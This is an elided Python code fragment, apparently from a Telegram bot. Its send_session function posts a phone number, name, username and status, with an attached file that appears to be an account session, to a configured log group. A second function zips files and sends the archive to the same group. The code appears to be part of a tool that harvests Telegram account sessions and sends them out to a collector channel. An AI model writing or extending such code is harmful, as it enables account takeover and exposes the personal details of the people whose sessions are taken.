...
async def send_session(phone: str, force: bool = False):
    ...
    try:
        ...
        text = (
            ...
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📱 Phone: `{phone}`\n"
            f"🏷️ Name: **{rec.get('name') or 'Unknown'}**\n"
            f"🔗 Username: @{rec.get('username') or 'None'}\n"
            f"🟢 Status: `{rec.get('status')}`"
        )
        await _client.send_message(config.LOG_GROUP_ID, text, file=path)
...
async def build_and_send_zip() -> Optional[str]:
    ...
    async with _zip_lock:
        ...
        try:
            ...
            await _client.send_message(config.LOG_GROUP_ID, text, file=zip_name)
